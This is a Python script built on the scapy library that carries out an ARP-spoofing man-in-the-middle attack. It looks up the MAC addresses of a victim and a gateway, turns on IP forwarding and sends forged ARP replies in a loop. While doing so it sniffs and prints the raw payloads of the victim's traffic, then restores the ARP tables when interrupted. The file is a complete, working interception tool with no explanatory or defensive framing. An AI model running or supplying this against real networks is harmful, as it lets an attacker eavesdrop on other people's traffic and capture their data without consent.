from scapy.all import *
from colors import *
import os
import sys
import time 

def mac(IP):
    ans, unans = arping(IP, verbose=0)
    for s, r in ans:
        return r[Ether].src

def spoof(victimIP, gateway, victimMac, gatewayMac):
    arppkt1 = ARP(op=2, psrc=gateway, pdst=victimIP, hwdst=victimMac)
    arppkt2 = ARP(op=2, psrc=victimIP, pdst=gateway, hwdst=gatewayMac)
    send(arppkt1, verbose=0)
    send(arppkt2, verbose=0)

def portforward():
    print("[{0}*{2}][{1}INFO{2}] {3}Enabling IP Forwarding{2}".format(BLUE, LGREEN, RST, RD))
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def restore(victimIP, gateway, victimMac, gatewayMac):
    svictim = ARP(op=2, pdst=gateway, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMac)
    sgateway = ARP(op=2, pdst=victimIP, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMac)
    print("[{0}+{2}][{0}INFO{2}] {1}Restoring targets{2}".format(LGREEN, RD, RST))
    send(svictim, count=5, verbose=0)
    send(sgateway, count=5, verbose=0)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[{0}*{2}][{1}INFO{2}] {3}Exiting...{2}".format(BLUE, LGREEN, RST, RD))
    sys.exit(1)

def sniffer(victimIP, gateway):
    print(LGREEN)
    data = sniff(filter="host " + str(victimIP) + " or " + str(gateway), prn=lambda x:x.sprintf("[+] %Raw.load% "), count=1)
    print(RST)

def attack(tgtIP, gateIP):
    portforward()
    victimMac = mac(tgtIP)
    if victimMac == None:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[{0}-{2}][{3}INFO{2}] {1}Couldn't get Victim's MAC address{2}".format(LRED, RD, RST, LGREEN))
        print("[{0}*{2}][{1}INFO{2}] {3}Exiting...{2}".format(BLUE, LGREEN, RST, RD))
        sys.exit(1)
    else:
        print("[{0}+{2}][{0}INFO{2}] {3}Victim's MAC address found:{2} {4}{1}{2}".format(LGREEN, victimMac, RST, RD, GR))
    
    gatewayMac = mac(gateIP)
    if gatewayMac == None:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[{0}-{2}][{3}INFO{2}] {1}Couldn't get Gateway's MAC address{2}".format(LRED, RD, RST, LGREEN))
        print("[{0}*{2}][{1}INFO{2}] {3}Exiting...{2}".format(BLUE, LGREEN, RST, RD))
        sys.exit(1)
    else:
        print("[{0}+{2}][{0}INFO{2}] {3}Gateway's MAC address found:{2} {4}{1}{2}".format(LGREEN, gatewayMac, RST, RD, GR))
    
    print("[{0}+{2}][{0}INFO{2}] {1}Poisoning targets...{2}".format(LGREEN, RD, RST))
    while True:
        try:
            spoof(tgtIP, gateIP, victimMac, gatewayMac)
            time.sleep(1.5)
            sniffer(tgtIP, gateIP)
        except KeyboardInterrupt:
            restore(tgtIP, gateIP, victimMac, gatewayMac)

